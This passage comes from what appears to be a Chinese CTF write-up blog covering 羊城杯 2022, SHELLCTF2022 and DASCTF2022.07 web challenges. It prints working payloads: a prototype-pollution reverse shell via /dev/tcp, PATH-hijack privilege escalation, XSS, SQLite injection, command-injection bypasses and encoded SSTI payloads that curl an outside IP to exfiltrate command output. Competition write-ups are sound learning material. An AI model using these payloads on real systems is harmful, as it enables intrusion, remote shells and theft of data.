class="property">realname</span>,</span><br><span class="line">            <span class="attr">age</span>: req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">age</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;home.ejs&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">real_name</span>: <span class="string">&#x27;Undefined&#x27;</span>,</span><br><span class="line">            <span class="attr">age</span>: <span class="string">&#x27;Undefined&#x27;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// update your info</span></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/update&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">admin</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;update.ejs&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> data = req.<span class="property">session</span>.<span class="property">data</span> || &#123;<span class="attr">realname</span>: <span class="string">&#x27;&#x27;</span>, <span class="attr">age</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        data = lodash.<span class="title function_">merge</span>(data, req.<span class="property">body</span>);</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = data;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">data</span>.<span class="property">realname</span>) &#123;</span><br><span class="line">          res.<span class="title function_">redirect</span>(<span class="string">&#x27;/home&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> host = server.<span class="title function_">address</span>().<span class="property">address</span>;</span><br><span class="line">    <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listening on http://%s:%s&quot;</span>, host, port);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>lodash.merge原型链污染</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904025029642.png" alt="image-20220904025029642"></p><p>找一个payload</p><p><a href="https://www.viewofthai.link/2022/04/22/lodash%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">lodash原型链污染 – View of Thai</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904025332243.png" alt="image-20220904025332243"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">administrator</span><br><span class="line">tHe_pAsSw0rd_thAt_y0u_NeVer_Kn0w</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/vps/7002 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>使用postman发包，进行原型链污染</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904073919262.png" alt="image-20220904073919262"></p><p>提权</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br><span class="line">/home/bunny</span><br></pre></td></tr></table></figure><p>发现&#x2F;home&#x2F;bunny</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904073244718.png" alt="image-20220904073244718"></p><p>根据&#x2F;home&#x2F;bunny的回显，推测是用了id命令，想办法替换id命令</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904074238796.png" alt="image-20220904074238796"></p><p>但是无论是替换，还是删除，权限都不够</p><p>后来发现，可以使用export来设置PATH的环境变量，将PATH设置为tmp目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>执行id命令的时候，会优先到tmp目录寻找并执行命令</p><p>在tmp目录下构造恶意的id命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span> &gt; /tmp/id</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp/id</span><br></pre></td></tr></table></figure><p>然后执行&#x2F;home&#x2F;bunny</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904082059141.png" alt="image-20220904082059141"></p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 2022 </tag>
            
            <tag> 羊城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHELLCTF2022复现</title>
      <link href="/2022/08/15/SHELLCTF2022%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/08/15/SHELLCTF2022%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="SHELLCTF2022复现"><a href="#SHELLCTF2022复现" class="headerlink" title="SHELLCTF2022复现"></a>SHELLCTF2022复现</h1><h2 id="Choosy"><a href="#Choosy" class="headerlink" title="Choosy"></a>Choosy</h2><blockquote><p>Single solution doesn’t works on all problems. One should try different solutions for different problem.</p><p>Flag format:- shellctf{H3re_1s_tH3_F14g}</p><p><a href="http://20.125.142.38:8324/">http://20.125.142.38:8324</a></p><p>Alternate link <a href="http://20.193.247.209:8333/">http://20.193.247.209:8333/</a></p></blockquote><p>这个打开之后是这样的</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505854105.png" alt="img"></p><p>功能是输入大写字母，返回小写字母，数字和字符不变。本来是想的是SSTI，但是怎么尝试也不行，看了wp才知道是xss</p><p>这个会解析html标签，但是会过滤script，可以使用img标签</p><p>onerror，在加载图片错误时执行javascript</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855106.png" alt="img"></p><p>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855107.png" alt="img"></p><h2 id="Colour-Cookie"><a href="#Colour-Cookie" class="headerlink" title="Colour Cookie"></a>Colour Cookie</h2><p>题目描述：</p><blockquote><p>Gone those days when no colours, images, fonts use to be on a webpage. We now have various ways to decorate our webpages and here is one such example.</p><p>Flag format :- shellctf{H3re_1s_F14g}</p><p><a href="http://20.125.142.38:8326/">http://20.125.142.38:8326</a></p><p><a href="http://20.193.247.209:8222/">http://20.193.247.209:8222/</a></p></blockquote><p>在&#x2F;static&#x2F;base_cookie.css中找到</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*   name=&quot;C0loR&quot;  */</span></span><br></pre></td></tr></table></figure><p>并且题目提示<code>Blue is my favourite colour</code>，但是受题目名称影响，在cookie上下工夫了，想偏了</p><p>正解应该是传参<code>C0loR=Blue</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//20.125.142.38:8326/check?C0loR=Blue</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855108.png" alt="img"></p><h2 id="Extractor"><a href="#Extractor" class="headerlink" title="Extractor"></a>Extractor</h2><p>题目描述：</p><blockquote><p>We are under emergency. Enemy is ready with its nuclear weapon we need to activate our gaurds but chief who had password is dead. There is portal at URL below which holds key within super-user account, can you get the key and save us.</p><p>Flag format :- shellctf{H3re_1s_tH3_fL4G}</p><p><a href="http://20.125.142.38:8956/">http://20.125.142.38:8956</a></p><p>Alternate URL :- <a href="http://20.193.247.209:8555/">http://20.193.247.209:8555/</a></p><p>More Alternate URL :- <a href="http://52.66.29.74:8999/">http://52.66.29.74:8999/</a></p></blockquote><p>有注册和登录两个功能</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855109.png" alt="img"></p><p>但是我测试的时候，即使不注册，也可以登录成功，不过返回的信息为空，如下</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855110.png" alt="img"></p><p>正常注册登录，就会返回用户注册的相关信息</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855111.png" alt="img"></p><p>同时注意url的变化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//20.125.142.38:8956/profile?username=555&amp;pass=555&amp;content=555</span></span><br></pre></td></tr></table></figure><p>进行sql注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//20.125.142.38:8956/profile?username=555%27--+</span></span><br></pre></td></tr></table></figure><p>回显</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855112.png" alt="img"></p><p>判断字段数为4</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile?username=<span class="number">555</span>%<span class="number">27</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>--+</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855113.png" alt="img"></p><p>但是我想使用database()，version()来进一步测试的时候，回显错误，所以应该不是mysql</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855114.png" alt="img"></p><p>看师傅们的wp才知道是sqlite注入</p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md</a></p><p>测试数据库版本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile?username=<span class="number">555</span>%<span class="number">27</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="title function_ invoke__">sqlite_version</span>()--+</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855115.png" alt="img"></p><p>注意3.30版本后sqlite_master才改名sqlite_schema,所以应该用sqlite_master。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile?username=<span class="number">555</span>%<span class="number">27</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,sql+FROM+sqlite_master--+</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855116.png" alt="img"></p><p>最后，不用区分大小写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile?username=<span class="number">555</span>%<span class="number">27</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,content+FROM+admins--+</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855117.png" alt="img"></p><h2 id="ILLUSION"><a href="#ILLUSION" class="headerlink" title="ILLUSION"></a>ILLUSION</h2><p>考点：命令注入</p><p>对关键命令替换为空，可以使用双写绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//20.125.142.38:8765/wH4t_Y0u_d1d?inn=llss</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856118.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;llss</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856119.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;ccdd ....;llss</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856120.png" alt="img"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;ccdd ....;cat flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856121.png" alt="img"></p><h2 id="Doc-Holder"><a href="#Doc-Holder" class="headerlink" title="Doc Holder"></a>Doc Holder</h2><p>题目描述：</p><blockquote><p>Can you share portable document with us which looks like it when we seet portable document with eyes but ti’s not actually portable document.</p><p>More a misc problem …</p><p>My Favourite move is Inferno overwrite </p><p><a href="http://20.125.142.38:8508/">http://20.125.142.38:8508</a></p><p>Alternate Link :- <a href="http://20.193.247.209:8666/">http://20.193.247.209:8666/</a></p><p>Hint — Challenge is all about file extension of the file that you are uploading….</p><p>Hint1: Think from right to left Hint2: Everything is just related to name and extension of file not content in file … Hint3: Give me file with name while when seen from eyes look like abc.pdf but its not actually pdf Hint4: Make file name “abc.fdp” look “abc.pdf”</p></blockquote><p>不允许文件名后缀为pdf，但是要让服务端解析为pdf</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856122.png" alt="img"></p><p><code>实现的方法是用控制字符，将fdp从右往左解析为pdf</code>(不清楚原理，用python测试的结果如下)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = [<span class="string">u&#x27;\u200f&#x27;</span>, <span class="string">u&#x27;\u202b&#x27;</span>, <span class="string">u&#x27;\u202e&#x27;</span>, <span class="string">u&#x27;\u2067&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    filename = <span class="string">&quot;sk1y.&quot;</span> + i + <span class="string">&quot;fdp&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(filename)</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856123.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://20.125.142.38:8508/&#x27;</span></span><br><span class="line">filename = <span class="string">&quot;abc.&quot;</span>+<span class="string">u&#x27;\u202e&#x27;</span>+<span class="string">&quot;fdp&quot;</span></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: (filename, <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;application/pdf&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url, files=files)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857124.png" alt="img"></p><p>同时在burpsuite测试的时候，发现在文件名前加上字符，并且为单引号，并且后面含有<code>fdp</code>，也可以成功</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857125.png" alt="img"></p><p>但是用双引号就不行</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857126.png" alt="img"></p><p>这一点还是不太理解</p><p>不过需要fdp才能成功，估计也是从右往左之类的原因</p><h2 id="RAW-Agent"><a href="#RAW-Agent" class="headerlink" title="RAW Agent"></a>RAW Agent</h2><p>题目描述：</p><blockquote><p>Day By Day Pollution is increasing, passing polluted environment and sum of all generation till now will take you to ultimate end.</p><p>Flag Format :- Enclose everything in shellctf{} Flag have two part :- shellctf{part1part2}</p><p>Part 1 start with :- U</p><p>Part 2 start with :- _p</p><p>Challenge url :- <a href="http://20.125.142.38:8525/">http://20.125.142.38:8525/</a></p><p>Alternate URL :- <a href="http://20.193.247.209:8777/">http://20.193.247.209:8777/</a></p><p>More Alternate URL :- <a href="http://52.66.29.74:8888/">http://52.66.29.74:8888/</a></p></blockquote><p>flag包括两部分，第一部分第一个字母为U，第二部分第一个字母为p</p><p>就是个Misc，不管了</p><h2 id="More-ILLUSION"><a href="#More-ILLUSION" class="headerlink" title="More ILLUSION"></a>More ILLUSION</h2><p>题目描述：</p><blockquote><p>If you still not illuded, here is another potion of illusion for you. Can you survive it ?????</p><p>You can <strong>du</strong> it ……..</p><p>Flag format :- enclose entire thing in shellctf{}</p><ul><li><p>A - Thing you got after solving problem</p></li><li><p>B - Linux command (not entire command but specific one command that lead you to solution, ex- “cd .. ; ls -la” was command that showed me thing which lead me to flag then special command is “ls” and argument is “la”)</p></li></ul><p>Example flag -</p><ul><li>Suppose I got string “H3re_1s_F1ag” from solving so my A &#x3D; H3re_1s_F1ag</li></ul><p>Some charaters are ommited complete the flag with all description above in below flag. ommited character corresponds to arguments of that you du.</p><p>After “H3re_1s_F1ag” one is special command rest are its arguments.</p><p>shellctf{H3re_1s_F1ag_xx_appaxxxx-xxxx_ah}</p><p>Challenge url :- <a href="http://20.125.142.38:8499/">http://20.125.142.38:8499/</a></p><p>Alternate URL :- <a href="http://52.66.29.74:8871/">http://52.66.29.74:8871/</a></p><p>More Alternate URL :- <a href="http://20.193.247.209:8822/">http://20.193.247.209:8822/</a></p></blockquote><p>参考ek1ng师傅的解法，使用do命令</p><blockquote><p>Linux du （英文全拼：disk usage）命令用于显示目录或文件的大小。</p><p>du 会显示指定的目录或文件所占用的磁盘空间。</p><p>-a或-all 显示目录中个别文件的大小。</p><p>-h或–human-readable 以K，M，G为单位，提高信息的可读性。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;dduu --apparent-size -ah</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857127.png" alt="img"></p><p>使用<a href="https://cyberchef.org/">https://cyberchef.org/</a> 进行整理</p><p>选择From HTML Entity 和 Unescape string 进行整理</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857128.png" alt="img"></p><p>选择一个大小为38的</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857129.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;<span class="built_in">cat</span> ./flag-------------/flag/flag/flag/flag/flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857130.png" alt="img"></p><p>包上shellctf{}即可</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>打国外的比赛还是太少了，经验不够，思路比较局限，比如第一个题目的xss，sqlite注入等等，还要继续努力学</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://ek1ng.com/SHELLCTF2022.html">https://ek1ng.com/SHELLCTF2022.html</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> SHELLCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2022.07赋能赛复现</title>
      <link href="/2022/08/07/DASCTF2022-07%E8%B5%8B%E8%83%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/08/07/DASCTF2022-07%E8%B5%8B%E8%83%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="DASCTF2022-07赋能赛复现"><a href="#DASCTF2022-07赋能赛复现" class="headerlink" title="DASCTF2022.07赋能赛复现"></a>DASCTF2022.07赋能赛复现</h1><p>[toc]</p><h2 id="Ez-to-getflag"><a href="#Ez-to-getflag" class="headerlink" title="Ez to getflag"></a>Ez to getflag</h2><p>会检查上传的文件的内容，不能存在php,可以使用短标签绕过，但是不知道文件上传的存放路径。</p><p>本来以为是文件上传，但是没想到是任意文件读取！！！</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220730174626603.png" alt="image-20220730174626603"></p><h2 id="Harddisk"><a href="#Harddisk" class="headerlink" title="Harddisk"></a>Harddisk</h2><p>fuzz，过滤了很多的关键词</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220731131121372.png" alt="image-20220731131121372"></p><p>其中大括号可以使用<code>&#123;%print(......)%&#125;</code>或<code>&#123;% if ... %&#125;1&#123;% endif %&#125;</code>的形式来代替，而print被过滤，所以用后者</p><p>根据过滤信息，<code>[]</code>，<code>点</code>，<code>class</code>等关键词都被过滤，所以使用attr和unicode编码进行绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>.__class__)%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;__class__&quot;</span>))%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>))%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>如果执行成功，回显555</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220731180108482.png" alt="image-20220731180108482"></p><p>因为只能根据是否回显555来判断，相当于盲注，所以用自动化脚本来判断寻找可以用的类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;__class__&quot;</span>)|attr(<span class="string">&quot;__base__&quot;</span>)|attr(<span class="string">&quot;__subclasses__&quot;</span>)()|attr(<span class="string">&quot;__getitem__&quot;</span>)(xx)|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;popen&quot;</span>))%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>)()|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="number">132</span>)|attr(<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="string">&quot;\u0070\u006f\u0070\u0065\u006e&quot;</span>))%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>进行爆破，得到132</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220801104937777.png" alt="image-20220801104937777"></p><p>因为不能回显，所以使用外带命令实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;__class__&quot;</span>)|attr(<span class="string">&quot;__base__&quot;</span>)|attr(<span class="string">&quot;__subclasses__&quot;</span>)()|attr(<span class="string">&quot;__getitem__&quot;</span>)(xx)|attr(<span class="string">&quot;__init__&quot;</span>)|attr(<span class="string">&quot;__globals__&quot;</span>)|attr(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;popen&quot;</span>)(<span class="string">&quot;curl 116.62.240.148:7011 -d &quot;</span>`ls /`<span class="string">&quot;&quot;</span>)|attr(<span class="string">&quot;read&quot;</span>)())%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>)()|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="number">132</span>)|attr(<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="string">&quot;\u0070\u006f\u0070\u0065\u006e&quot;</span>)(<span class="string">&quot;\u0063\u0075\u0072\u006c\u0020\u0031\u0031\u0036\u002e\u0036\u0032\u002e\u0032\u0034\u0030\u002e\u0031\u0034\u0038\u003a\u0037\u0030\u0031\u0031&quot;</span>)|attr(<span class="string">&quot;\u0072\u0065\u0061\u0064&quot;</span>)())%&#125;<span class="number">555</span>&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>不知道是不是题目环境问题，curl有时候行，有时候不行，有时候销毁靶机之后就会像下面这样忽然出现一大堆的请求（真神奇）</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220801132613514.png" alt="image-20220801132613514"></p><p>而后销毁又申请环境好多次，尝试无果。。。</p><h2 id="绝对防御"><a href="#绝对防御" class="headerlink" title="绝对防御"></a>绝对防御</h2><p>JSFinder：查找隐藏在js文件中的api 接口和敏感目录，以及一些子域名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python JSFinder.py -u http://badcc3c9-4df2-4c54-a430-bc7c8b122353.node4.buuoj.cn:<span class="number">81</span>/</span><br></pre></td></tr></table></figure><p>扫描结果</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220801234847743.png" alt="image-20220801234847743"></p><p>访问SUPPERAPI.php，查看源代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 